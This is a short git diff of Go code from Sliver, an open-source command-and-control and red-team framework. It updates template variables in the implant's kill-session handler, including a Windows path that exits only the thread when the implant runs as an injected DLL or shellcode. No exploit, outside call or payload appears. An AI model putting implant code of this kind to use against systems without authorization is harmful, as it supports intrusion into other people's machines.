@@ -24,8 +24,8 @@ import (
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/sliver/transports"
 
-	// {{if .IsSharedLib}}
-	// {{if eq .GOOS "windows"}}
+	// {{if .Config.IsSharedLib}}
+	// {{if eq .Config.GOOS "windows"}}
 	"runtime"
 	"syscall"
 
@@ -47,14 +47,14 @@ func GetSpecialHandlers() map[uint32]SpecialHandler {
 func killHandler(data []byte, connection *transports.Connection) error {
 	killReq := &sliverpb.KillSessionReq{}
 	err := proto.Unmarshal(data, killReq)
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	println("KILL called")
 	// {{end}}
 	if err != nil {
 		return err
 	}
-	// {{if .IsSharedLib}}
-	// {{if eq .GOOS "windows"}}
+	// {{if .Config.IsSharedLib}}
+	// {{if eq .Config.GOOS "windows"}}
 	if runtime.GOOS == "windows" {
 		// Windows only: ExitThread() instead of os.Exit() for DLL/shellcode slivers
 		// so that the parent process is not killed
@@ -71,7 +71,7 @@ func killHandler(data []byte, connection *transports.Connection) error {
 	//{{end}}
 	// Cleanup connection
 	connection.Cleanup()
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	println("Let's exit!")
 	// {{end}}
 	os.Exit(0)
